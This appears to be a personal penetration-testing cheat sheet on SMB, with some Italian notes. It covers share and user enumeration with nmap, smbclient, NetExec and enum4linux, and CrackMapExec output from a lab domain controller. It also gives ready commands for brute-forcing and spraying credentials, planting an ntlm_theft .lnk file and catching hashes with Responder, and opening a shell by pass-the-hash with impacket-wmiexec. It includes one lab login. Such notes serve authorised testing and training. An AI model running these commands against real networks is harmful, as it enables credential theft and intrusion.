 ===[ NMAP ]===
 Nmap comes with several SMB-related scripts such as (cd /usr/share/nmap/scripts; ls |  grep smb):

	nmap -p 139,445 --script [script name] X.X.X.X
	
	- smb-brute – Performs brute-force password auditing against SMB servers.
	- smb-system-info – Collects system information through SMB/NetBios.
	- smb-vuln-smb/cve* – Identifies whether the SMB server is vulnerable to any known exploits.
	- smb-os-discovery - enumerate the Operating System of target system along with other ( Computer,Domain and Forest Name ecc ecc )
	- smb-enum-shares – Enumerates SMB shares in an SMB server.
	- smb-enum-users - enumerate all users on remote Windows system using 2 different techniques ( SAMR Enumeration,LSA Bruteforcing )
	- smb-enum-domains - enumerate all domains on remote Windows system
	- smb-enum-groups - enumerate all groups on remote Windows system
	- smb-enum-processes - enumerate all processes on remote Windows system
	- mb-enum-services - enumerate all services on remote Windows system
	- smb-enum-sessions - enumerate all sessions on remote Windows system
	- nbtstat - enumerate the target’s NetBIOS names and MAC address
	
	nmap --script smb-brute -p 139,445 <target-ip>
	nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 139,445 <target-ip>
	nmap --script smb-enum* -p 139,445 <target-ip>
	nmap --script smb-protocols -p 139,445 <target-ip>
	nmap --script smb-vuln* -p 139,445 <target-ip>
	
	It is good practice to run smb-enum* to collect general information about the server and smb-vuln* to collect information about any known exploits that might affect the server..
			
    sudo nmap --script smb-enum-shares -p 139,445 <Target IP> OR sudo nmap --script smb-enum* -p 139,445 <Target IP> --> enumerate all ( shares, users, groups ecc ecc )
 
	sudo nmap --script smb-vuln* -p 139,445 <Target IP> --> NSE Script to check for vulnerabilities , * stand for check all
	
	
	
 
 ===[ SMBCLIENT ]===
 smbclient -L/-N <target IP> --> list share
	-L	list share ( or enum share ) 
	-N Anonymous user or No password

	smbclient -N -L <target-ip>
	smbclient -L <target-ip> -U username
	
	smbclient [-U username] [-P password or -N for no password] -L \\\\X.X.X.X --> list share as current user without password
	smbclient [-U username] [-P password or -N for no password] \\\\X.X.X.X\\share	--> connect to share as current user without password
 
 ===[ SMBMAP ]===
 smbmap -H <Target IP> --> enumerate the target IP as unathenticated user
 -H Host
 -P port ( opt. )
 -u user
 -p password
 -p "<NT>:<LM>" NTLM hashes for password
 -r [Folder] --> NON recursive listing
 -R [Folder] --> recursive listing
 -A <filename> --> search for a filename
 -q for quiet verbose output
 
 ### Execute a command ###
	smbmap -u username -p password -H <target-ip> -x 'ipconfig'
 
 ===[ RPCCLIENT ]===
 rpcclient -U "" -N <Target IP>
 -U username ("" null )
 -N Target IP
 –pw-nt-hash	use hash password format
 ONCE CONNECTED:
	queryuser	Retrieve user information
	querygroup	Retrieve group information
	querydominfo	Retrieve domain information
	enumdomusers	Enumerate domain users
	lookupsids	Look up SIDs to usernames
	lsaaddacctrights	Add rights to a user account
 
 and other commands
 
 ===[ ENUM4LINUX ]===
BASIC 
enum4linux <target-ip>
# All enumeration
enum4linux -a <target-ip>
# Verbose
enum4linux -v <target-ip>
# Specify username and password
enum4linux -u username -p password <target-ip>

# Enum4linux-ng
# -A: All simple enumeration including nmblookup
enum4linux-ng -A <target-ip>
# -As: All simple short enumeration without NetBIOS names lookup
enum4linux-ng -As <target-ip>
# -u: Specific username
# -p: Specific password
enum4linux-ng -u "administrator" -p "password" <target-ip>
 
 ===[ CRACKMAPEXEC ]===
 https://github.com/byt3bl33d3r/CrackMapExec
 For documentation and usage examples, visit: https://www.netexec.wiki/
 
 usage: cme [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER]
           [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [--version]
           {mssql,winrm,ldap,smb,ssh,vnc,wmi,ftp,rdp} ...

    Version : 1.2.0
    Codename: ItsAlwaysDNS
    Commit  : 68589588
    

options:
  -h, --help            show this help message and exit
  --version             Display nxc version

Generic:
  Generic options for nxc across protocols

  -t THREADS, --threads THREADS
                        set how many concurrent threads to use
  --timeout TIMEOUT     max timeout in seconds of each thread
  --jitter INTERVAL     sets a random delay between each authentication

Output:
  Options to set verbosity levels and control output

  --verbose             enable verbose output
  --debug               enable debug level information
  --no-progress         do not displaying progress bar during scan
  --log LOG             export result into a custom file

DNS:
  -6                    Enable force IPv6
  --dns-server DNS_SERVER
                        Specify DNS server (default: Use hosts file & System DNS)
  --dns-tcp             Use TCP instead of UDP for DNS queries
  --dns-timeout DNS_TIMEOUT
                        DNS query timeout in seconds

Available Protocols:
  {mssql,winrm,ldap,smb,ssh,vnc,wmi,ftp,rdp}
    mssql               own stuff using MSSQL
    winrm               own stuff using WINRM
    ldap                own stuff using LDAP
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    vnc                 own stuff using VNC
    wmi                 own stuff using WMI
    ftp                 own stuff using FTP
    rdp                 own stuff using RDP

	cme smb 10.10.11.174		--> SMB Enumeration brief
	SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
	
	cme smb 10.10.11.174 --shares	--> SMB share Enumeration 
	SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
	SMB         10.10.11.174    445    DC               [-] Error getting user: list index out of range
	SMB         10.10.11.174    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

	cme smb 10.10.11.174 --shares -u '' -p ''	--> SMB share Enumeration with null auth
	SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
	SMB         10.10.11.174    445    DC               [+] support.htb\: 
	SMB         10.10.11.174    445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
	
	cme smb 10.10.11.174 --shares -u 'pippo' -p ''	--> SMB share Enumeration with Anonymous (or guest ?) auth
	SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
	SMB         10.10.11.174    445    DC               [+] support.htb\pippo: 
	SMB         10.10.11.174    445    DC               [*] Enumerated shares
	SMB         10.10.11.174    445    DC               Share           Permissions     Remark
	SMB         10.10.11.174    445    DC               -----           -----------     ------
	SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
	SMB         10.10.11.174    445    DC               C$                              Default share
	SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
	SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
	SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
	SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share 

 
 
  ===[ NMBLOOKUP ]===
 nmblookup -A <Target IP>  --> host enumeration by IP Address
    00: Workstation Service (workstation name)
    03: Windows Messenger service
    06: Remote Access Service
    20: File Service (also called Host Record)
    21: Remote Access Service client
    1B: Domain Master Browser – Primary Domain Controller for a domain
    1D: Master Browser
    1C: Domain Controllers for a domain
    1E: Browser Service Elections
 
 ===[ NMBSCAN ]===
 nbtscan -r <target IP[24]>	--> host[/network] enumeration by IP Address

 ===[ METASPLOIT ]===
	msf6> use auxiliary/scanner/smb/smb_enumshares
	msf6> auxiliary(scanner/smb/smb_enumshares) > set rhosts <target IP>
	msf6> auxiliary(scanner/smb/smb_enumshares) > set smbuser <username>
	msf6> auxiliary(scanner/smb/smb_enumshares) > set smbpass <password>
	msf6> auxiliary(scanner/smb/smb_enumshares) > exploit

 ===[ IMPACKET ]===
 https://github.com/SecureAuthCorp/impacket

 ====[ SMB VERSION ]====
 Protocol	Client			Server						DATA ONTAP
 SMB1.0		Windows XP		Windows Server 2000/2003	All
 SMB2.0		Windows Vista	Windows Server 2008			7.3.1 and Later, 8.x
 SMB2.1		Windows 7		Windows Server 2008R2		8.1 clustered Data ONTAP; 8.1.1 7-Mode
 SMB3.0		Windows 8		Windows Server 2012			clustered Data ONTAP 8.2 and later
 SMB3.02	Windows 8		Windows Server 2012R2
 SMB3.1		Windows 10		Windows Server 20016		ONTAP 9


 ===[ NetExec (https://www.netexec.wiki/) ]===
netexec smb 10.0.0.0/24
netexec smb <target-ip>
netexec smb <target-ip-1> <target-ip-2>
netexec smb <target-ip> --pass-pol
netexec smb <target-ip> --groups
netexec smb <target-ip> --users
# With authentication
netexec smb <target-ip> -u username -p password
netexec smb <target-ip> -u username -p password --users
# With Kerberos authentication
netexec smb <target-ip> -k --users
# -M zerologon: Scan for ZeroLogon
# -M petitpotam: Scan for PetitPotam
netexec smb <target-ip> -u '' -p '' -M zerologon -M petitpotam

 ### List Shares ###
netexec smb <target-ip> -u '' -p '' --shares
netexec smb <target-ip> -u username -p password --shares

 ===[ EVIL-WINRM]===

evil-winrm -i 10.129.37.195 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'

 ===[ LDAPSEARCH ]===
 
  ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 ( ATTENZIONE ALLA SINTASSI --> POTREBBE ESSERE DIFFERENTE )
	-x	use simple auth
	-b 	basename domain
	-H  ldap server 
	
 ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 '(objectClass=Person)' sAMAccountName
	'(objectClass=Person|User)'	query for element classified as person or user
	sAMAccountName			restrict query to account name only
 '{ print $2 }' 
 
 ====[ BRUTE FORCE CREDENTIALS ]====
 netexec smb <target-ip> -u username -p passwords.txt --continue-on-success
	netexec smb <target-ip> -u usernames.txt -H ntlm_hashes.txt --continue-on-success

	hydra -l username -P passwords.txt <target-ip> smb
	hydra -L usernames.txt -p password <target-ip> smb

	# RID Brute Force
	netexec smb <target-ip> -u username -p password --rid-brute 20000

	# Using Metasploit
	msfconsole
	msf> use auxiliary/scanner/smb/smb_login

	#### If we find credentials, we can use them for smbclient or WinRM.
	#### If we got "STATUS_PASSWORD_MUST_CHANGE" for some users, we can update a current password to a new one.

	smbpasswd -r <target-ip> -U <username>
	# or
	impacket-smbpasswd <DOMAIN>/<username>:<password>@<target-ip> -newpass <new-password>
	# If you don't have impacket-smbpasswd, download it from a repository.
	wget https://raw.githubusercontent.com/fortra/impacket/master/examples/smbpasswd.py
	
 ====[ RID enumeration ]====
	It attempts to enumerate user accounts through null sessions.
	
	# Anonymous logon
	# 20000: Maximum RID to be cycled
	impacket-lookupsid example.local/anonymous@<target-ip> 20000 -no-pass
	impacket-lookupsid example.local/guest@<target-ip> 20000 -no-pass
	impacket-lookupsid example.local/guest@<target-ip> 20000
	# Specify user
	impacket-lookupsid example.local/user@<target-ip> 20000 -hashes <lmhash>:<nthash>
	impacket-lookupsid example.local/user@<target-ip> 20000


	# USEFUL COMMAND
	# This command extract usernames. It's useful for further enumeration which uses usernames.
	# Replace the following keywords:
	#  - `example.com` => Target domain
	#  - `10.0.0.1`    => Target IP
	#  - `DOMAIN`      => Target domain name
	impacket-lookupsid example.com/guest@10.0.0.1 20000 -no-pass > tmp.txt | cat tmp.txt | grep SidTypeUser | cut -d ' ' -f 2 | sed 's/DOMAIN\\//g' | sort -u > users.txt && rm tmp.txt

	====[ PASSWORD SPRAYING ATTACK ]====
	If we have a user password, we might be able to find another user with the same password.
	# User enumeration
	netexec smb <target-ip> -u John -p Password123 --users
	netexec smb <target-ip> -u John -H <NTLM_HASH> --users

	# Find users with same password
	netexec smb <target-ip> -u users.txt -p Password123 --continue-on-success
	netexec smb <target-ip> -u users.txt -p found_passwords.txt --continue-on-success
	netexec smb <target-ip> -u users.txt -H <NTLM_HASH> --continue-on-success
	netexec smb <target-ip> -u users.txt -H found_ntlm_hashes.txt --continue-on-success

	====[ NTLM THEFT ]====

	Repository: https://github.com/Greenwolf/ntlm_theft
	# -g all: Generate all files.
	# -s: Local IP (attacker IP)
	# -f: Folder to store generated files.
	python3 ntlm_theft -g all -s <local-ip> -f samples
	After generating files with ntlm_theft , put the .lnk file (samples.lnk here) to the shared folder.
	smbclient -N //10.0.0.1/example

	smb> put samples.lnk
	
	Now start Responder to retrieve the stolen NTLM hashes. Run the following command in our local machine:

	sudo responder -I eth0
	
	You can use smbclient to connect the target.

	# anonymous login
	smbclient //10.0.0.1/somedir -N
	# If the folder name contains spaces, surround with double quotes
	smbclient "//10.0.0.1/some dir" -N
	# Specify user
	smbclient //10.0.0.1/somedir -U username
	# nobody, no-pass
	smbclient //10.0.0.1/somedir -N -U nobody
	# Specify workgroup
	smbclient -L 10.0.0.1 -W WORKGROUP -U username
	
	To get a Windows shell, run the following examples.
	impacket-wmiexec example.local/username@10.0.0.1
	# Pass the Hash
	impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1
